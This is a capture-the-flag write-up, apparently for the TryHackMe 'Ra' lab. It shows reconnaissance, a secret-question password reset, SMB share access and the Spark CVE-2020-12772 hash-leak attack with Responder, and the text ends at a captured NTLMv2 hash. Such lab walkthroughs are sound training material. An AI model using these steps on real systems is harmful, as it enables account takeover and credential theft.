<p align="center">
  THM : Ra<br>
  Difficulty : Hard<br>
  Room link : https://tryhackme.com/room/ra<br>
  <img src="https://i.imgur.com/JcHpToZ.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [DNS enumeration](#dns-enumeration)
- [Website enumeration](#website-enumeration)
- [SMB enumeration](#smb-enumeration)
- [Exploit Spark 2.8.3](#exploit-spark-283)
- [Cracking NTLM hash](#cracking-ntlm-hash)
- [Getting a shell](#getting-a-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target (the scan takes a long time to finish. You can use `-d` option to show discovered ports during the scan
without waiting for the scan to finish) :  
```
attacker@AttackBox:~/Ra$ nmap 10.10.32.34 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-27 22:10 CET
Nmap scan report for 10.10.32.34
Host is up (0.038s latency).
Not shown: 65501 filtered ports
PORT      STATE SERVICE             VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http                Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2023-01-27 21:12:11Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2023-01-27T21:14:28+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2023-01-26T21:09:08
|_Not valid after:  2023-07-28T21:09:08
|_ssl-date: 2023-01-27T21:15:08+00:00; 0s from scanner time.
5222/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     unknown: 
| 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|_    stream_id: 5mzync9pum
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     unknown: 
| 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|_    stream_id: 9peut2azgb
5263/tcp  open  ssl/unknown
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
| 
|     features: 
| 
|     unknown: 
| 
|     compression_methods: 
| 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
| 
|_    capabilities: 
5270/tcp  open  ssl/xmp?
5275/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     unknown: 
| 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|_    stream_id: ani3dkorrk
5276/tcp  open  ssl/unknown
7070/tcp  open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 27 Jan 2023 21:12:17 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 27 Jan 2023 21:12:23 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 27 Jan 2023 21:12:34 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 27 Jan 2023 21:12:35 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
9389/tcp  open  mc-nmf              .NET Message Framing
49670/tcp open  msrpc               Microsoft Windows RPC
49672/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  msrpc               Microsoft Windows RP
49694/tcp open  msrpc               Microsoft Windows RPC
6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=1/27%Time=63D43E30%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.80%I=7%D=1/27%Time=63D43E3F%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.80%I=7%D=1/27%Time=63D43E3F%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.80%I=7%D=1/27%Time=63D43E46%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.80%I=7%D=1/27%Time=63D43E32%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2027\x20Jan\x202
SF:023\x2021:12:17\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\x
SF:2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<me
SF:ta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\
SF:n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C
SF:3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illega
SF:l\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x2
SF:0400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPO
SF:ptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2027\x20Jan\x202023
SF:\x2021:12:23\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.80%T=SSL%I=7%D=1/27%Time=63D43E43%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2027\x20Ja
SF:n\x202023\x2021:12:34\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x20
SF:2020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title
SF:>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</
SF:head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Fri,\x2027\x20Jan\x202023\x2021:12:35\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x204
SF:00\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-27T21:14:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 659.23 seconds
```

Note that port 5985 is open, so we may be able to use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) later.  

## DNS enumeration 

Nmap found a domain : `windcorp.thm`.
It also found a subdomain : `fire.windcorp.thm`

Port 53 is open. It correspond to the default port for DNS. Let's use [dig](https://linux.die.net/man/1/dig) to enumerate other subdomains :  
```
attacker@AttackBox:~/Ra$ dig @10.10.32.34 windcorp.thm any

; <<>> DiG 9.16.33-Debian <<>> @10.10.32.34 windcorp.thm any
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52270
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.			IN	ANY

;; ANSWER SECTION:
windcorp.thm.		600	IN	A	192.168.16.27
windcorp.thm.		3600	IN	NS	fire.windcorp.thm.
windcorp.thm.		3600	IN	SOA	fire.windcorp.thm. hostmaster.windcorp.thm. 180 900 600 86400 3600

;; ADDITIONAL SECTION:
fire.windcorp.thm.	3600	IN	A	192.168.112.1
fire.windcorp.thm.	3600	IN	A	10.10.32.34

;; Query time: 0 msec
;; SERVER: 10.10.32.34#53(10.10.32.34)
;; WHEN: Fri Jan 27 22:25:15 CET 2023
;; MSG SIZE  rcvd: 155
```

We found another subdomain : `hostmaster.windcorp.thm`

Let's add this to our `/etc/hosts` file :  
```
attacker@AttackBox:~/Ra$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	AttackBox
10.10.32.34	windcorp.thm	fire.windcorp.thm	hostmaster.windcorp.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Website enumeration

Let's enumerate the website using [gobuster](https://github.com/OJ/gobuster) :  
```
attacker@AttackBox:~/Ra$ gobuster dir -u http://windcorp.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://windcorp.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/27 22:29:48 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 147] [--> http://windcorp.thm/img/]
/css                  (Status: 301) [Size: 147] [--> http://windcorp.thm/css/]
/vendor               (Status: 301) [Size: 150] [--> http://windcorp.thm/vendor/]
/IMG                  (Status: 301) [Size: 147] [--> http://windcorp.thm/IMG/]
/CSS                  (Status: 301) [Size: 147] [--> http://windcorp.thm/CSS/]
/Img                  (Status: 301) [Size: 147] [--> http://windcorp.thm/Img/]
Progress: 220556 / 220561 (100.00%)
===============================================================
2023/01/27 22:42:36 Finished
===============================================================
```

We did not found anything interesting using [gobuster](https://github.com/OJ/gobuster). If we try to visit `/vendor`, we have an error `403 Forbidden`. The other 
directories are not useful for us. Let's enumerate the website manually using a web browser :  
![](https://i.imgur.com/hUPJ5Qj.jpg)  

We have a functionnality to reset passwords. Let's take a look at this functionnality by clicking on the blue `Reset password` button at the top of 
the page :  
![](https://i.imgur.com/eFWFa3m.jpg)  

It is possible to reset the password for a user just by entering the answer to a secret question. We can select one of these questions :  
- What is your mothers maiden name ?
- What was your first grade teachers name ?
- What is/was your favorite pets name ?
- What make was your first car ?

Let's see what more we can find on the main page :  
![](https://i.imgur.com/cyvvRRC.jpg)  

We can see which employees are online, busy or offline. Let's scroll more to see if there is any useful informations :  
![](https://i.imgur.com/VspLDVB.jpg)  

If you look carefuly at the 3 profile pictures here, there is one that can be useful. Lily Levesque has a profile picture with a dog and she says 
`I love being able to bring my best friend to work with me !`. We may be able to reset her password by using the secret 
question `What is/was your favorite pets name ?` but we need her username and the name of her dog. We can find it by looking at the name of the picture 
in the source code :  
![](https://i.imgur.com/BSXosvT.jpg)  

So her username is `lilyle`, and the name of her dog is `Sparky`. Let's try to use those two informations to reset her password :  
![](https://i.imgur.com/Fod9yJP.jpg)  

![](https://i.imgur.com/aBDKgnM.jpg)  

We successfully reset the password for user `lilyle` ! I tried to connect to the target using RDP but it didn't worked. Same for [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). 

## SMB enumeration

But there is one service we can connect to with those credentials, SMB. We can list SMB shares using [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) :  
```
attacker@AttackBox:~$ smbclient -L //windcorp.thm -U lilyle
Enter WORKGROUP\lilyle's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shared          Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

There are 2 interesting shares here :  
- Shared -> contains the first flag and installers in different formats for Spark 2.8.3
- Users -> This share seems to leads to `C:\Users`

Let's connect to the share named `Shared` :  
```
attacker@AttackBox:~$ smbclient //windcorp.thm/Shared -U lilyle
Enter WORKGROUP\lilyle's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 30 02:45:42 2020
  ..                                  D        0  Sat May 30 02:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020

		15587583 blocks of size 4096. 10911374 blocks available
smb: \> get "Flag 1.txt"
getting file \Flag 1.txt of size 45 as Flag 1.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \> get spark_2_8_3.tar.gz 
getting file \spark_2_8_3.tar.gz of size 123216290 as spark_2_8_3.tar.gz (2620,0 KiloBytes/sec) (average 2612,4 KiloBytes/sec)
```

We don't have read or write permissions on any directory in `Users` share.

## Exploit Spark 2.8.3

Spark 2.8.3 is vulnerable to [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/CVE-2020-12772). We may be able to capture the NTLM hash of a user, crack it, and use it to connect to the machine using 
[RDP](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) or [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). 

Let's extract `spark_2_8_3.tar.gz` :  
```
attacker@AttackBox:~/Ra$ ls
gobusterResults.txt  nmapResults.txt  spark_2_8_3.tar.gz
attacker@AttackBox:~/Ra$ tar -xf spark_2_8_3.tar.gz 
attacker@AttackBox:~/Ra$ ls
gobusterResults.txt  nmapResults.txt  Spark  spark_2_8_3.tar.gz^
attacker@AttackBox:~/Ra$
```

Let's see what's in the `Spark` directory :  
```
attacker@AttackBox:~/Ra/Spark$ ls -la
total 76
drwxr-xr-x 11 attacker attacker  4096 29 janv.  2017 .
drwxr-xr-x  3 attacker attacker  4096 28 janv. 04:12 ..
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 bin
drwxr-xr-x  4 attacker attacker  4096 29 janv.  2017 documentation
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 .install4j
drwxr-xr-x  6 attacker attacker  4096 29 janv.  2017 jre
drwxr-xr-x  6 attacker attacker  4096 29 janv.  2017 lib
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 logs
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 plugins
drwxr-xr-x  3 attacker attacker  4096 29 janv.  2017 resources
-rwxr-xr-x  1 attacker attacker 14090 29 janv.  2017 Spark
-rwxr-xr-x  1 attacker attacker 13056 29 janv.  2017 starter
drwxr-xr-x  3 attacker attacker  4096 29 janv.  2017 xtra
```

Trying to run `Spark` or `start` did nothing. But we can find a `.sh` script in `resources/`. Let's run it :  
```
attacker@AttackBox:~/Ra/Spark$ ls -la
total 76
drwxr-xr-x 11 attacker attacker  4096 29 janv.  2017 .
drwxr-xr-x  3 attacker attacker  4096 28 janv. 04:12 ..
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 bin
drwxr-xr-x  4 attacker attacker  4096 29 janv.  2017 documentation
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 .install4j
drwxr-xr-x  6 attacker attacker  4096 29 janv.  2017 jre
drwxr-xr-x  6 attacker attacker  4096 29 janv.  2017 lib
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 logs
drwxr-xr-x  2 attacker attacker  4096 29 janv.  2017 plugins
drwxr-xr-x  3 attacker attacker  4096 29 janv.  2017 resources
-rwxr-xr-x  1 attacker attacker 14090 29 janv.  2017 Spark
-rw-r--r--  1 attacker attacker 13056 29 janv.  2017 starter
drwxr-xr-x  3 attacker attacker  4096 29 janv.  2017 xtra
attacker@AttackBox:~/Ra/Spark$ cd resources/
attacker@AttackBox:~/Ra/Spark/resources$ ls
Info.plist  jniwrap.dll  jniwrap.lic  sounds  startup.sh  systeminfo.dll
attacker@AttackBox:~/Ra/Spark/resources$ chmod +x startup.sh 
attacker@AttackBox:~/Ra/Spark/resources$ ./startup.sh
...
...
```

So Spark has started and we are asked for a username, a password and a domain. We already have those 3 informations :  
![](https://i.imgur.com/h8z0ILs.jpg)  

But if we try to connect we have an error :  
![](https://i.imgur.com/AtXEDQF.jpg)  

To ignore this error, we have to click on `Advanced`, and select those two options :  
![](https://i.imgur.com/Oxw9B8P.jpg)  

And we are connected !  
![](https://i.imgur.com/rnte1D9.jpg)  

Now, let's start [Responder](https://github.com/SpiderLabs/Responder) to capture the request that will contain a NTLM hash :  
```
attacker@AttackBox:~/Ra$ sudo responder.py -I tun0
[sudo] Mot de passe de attacker : 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C

/!\ Warning: files/AccessDenied.html: file not found
/!\ Warning: files/BindShell.exe: file not found

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.14.32.60]
    Challenge set              [1122334455667788]



[+] Listening for events...
```

Now let's get the NTLM hash of a user. If you remember, we can see who is online on the main page of the website. Buse Candan seems always online. Let's search for his name at the bottom of the GUI :  
![](https://i.imgur.com/eb62wWq.jpg)  

It opens up another window :  
![](https://i.imgur.com/hJ60Vtb.jpg)  

We can right click on `buse@fire.windcorp.thm` and select `Conversion` to start a conversation with `Buse Candan` :  
![](https://i.imgur.com/DU7ekFS.jpg)  

Now, we can exploit [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/CVE-2020-12772) :  
![](https://i.imgur.com/FswSL0c.jpg)  

Now let's take a look at [Responder](https://github.com/SpiderLabs/Responder) :  
```
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.11.49
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:1122334455667788:16998638821A2C9C1543A335A2FA64DC:0101000000000000E05C1651CE32
D901106498E2612BD596000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062
002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500
120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000038BABF4BBB8507BB4EC2D70DF0D0D4A834D3B
62097FF9914688C83B9D4891850A00100000000000000000000000000000000000090000000000000000000000
```

